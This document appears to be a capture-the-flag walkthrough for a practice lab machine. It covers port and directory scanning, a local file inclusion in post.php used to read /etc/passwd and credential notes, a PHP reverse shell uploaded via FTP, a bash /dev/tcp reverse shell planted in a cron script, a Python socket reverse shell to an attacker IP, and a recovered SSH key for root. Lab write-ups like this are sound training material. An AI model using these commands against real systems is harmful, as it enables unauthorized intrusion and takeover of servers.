When approching a machine my first step is to use a map to see what is running on the server.
`nmap -sV 10.10.130.17`
When this command is run the first thing I notice is the http server and then secondly I see the ftp server.

Let's take a look at the http server. I want to take a look at the website. This website looks like a blog. When you open one of the blog posts and take a look at it. First I looked at the URL to see that this blog uses php to access posts. We will come back to this later.
Next, I used gobuster to fuzz the directories of the machine, you can also use dirbuster or ffuf.

`gobuster dir -u 10.10.130.17 -w /usr/share/wordlists/dirb/common.txt`

After this command is run, we see there is a robots.txt. Lets take a look at it.
looking at 10.10.130.17/robots.txt, we find flag_1 and secret_file_do_not_read.txt. Congrats, We have our first flag!

Now let's try and open secret_file_do_not_read.txt. We don't have permission to open this file, but maybe we can bypass this?
Let's open a blog post again. In the url of the posts we have 

"http://10.10.130.17/post.php?post=&lt;postname>.php".

The first thing I do when I see a php query is try to view /etc/passwd as a test.

"http://10.10.130.17/post.php?post=/etc/passwd"

From this we can see the file, there are two users that I see: Mat and Toby.
Now that we know we can view files with this, lets open the secret file.

"http://10.10.130.17/post.php?post=secret_file_do_not_read.txt"

In this file there is a note to Mat about ftp credentials.
when we sign into the ftp server we see some files: a directory called files and flag_2.txt

We can copy the flag to our local machine with the get command and then view the flag on our local machine.

Now that we have the ability to ftp into the machine, we can spawn a reverse shell with a php script. I am using the one here: 
[php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 

To make this script work we need to change the IP and port.

In this screenshot I changed the IP to my ip address and port to 4444.

Next we upload the script, sign into the ftp server once again, and cd into the files directory. Upload the php file you just modified using 

`put <path to file on local machine>`

Once it's uploaded we need to find where the file was saved. On the note to Mat, Will says the files are saved in /home/ftpuser/ftp/files. Let's go to the file we uploaded using the php url we used to see this note.

We see an error in the code, which in our case is good. This shows our code is uploaded.

Next we need to listen for the shell to spawn using `nc -lvnp 4444`

Now we see that we have a shell!
To make this shell look a little nicer we can run
```
/usr/bin/script -qc /bin/bash /dev/null`
control + z to put the shell in the background
stty raw -echo
fg
export TERM=xterm
```

Lets try to find our third flag
`find / -name flag_3.txt 2>/dev/null`	

If we run whoami we can see that we are www-data.

Next, lets see what commands we can run with sudo with "sudo -l"
After running this command we see we can run any command with the user, Toby.
We can use this to see flag_4.txt in Toby's home directory with "sudo -u toby cat /home/toby/flag_4.txt"

In the same directory there is an note.txt, view it with the same command we just did but with note.txt. In the file it talks about cron jobs.

To view cron tabs you can run `cat /etc/crontab`

We can edit the job in /home/toby/jobs/cow.sh
and add this line
`bash -i >& /dev/tcp/10.8.98.192/4444 0>&1`
to create a reverse shell to intercept with nc

Once we have the shell we can cat out flag_5.txt and stabalize the shell as we did earlier 

Next, run in the scripts directory with another nc session listening 
`echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.8.108.69',9898));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" > cmd.py`

Here you can get the next flag in Will's home directory

After some looking around with the Will user I found a .b64 file in /opt/backups/key.b64, With this file I used `base64 -d key.b64 > id_rsa` and downloaded it with `python3 -m http.server`

Finally we can ssh `ssh -i id_rsa root@10.10.193.197`
and cat out flag_7.txt.

Congratulations, flag 7 completed!
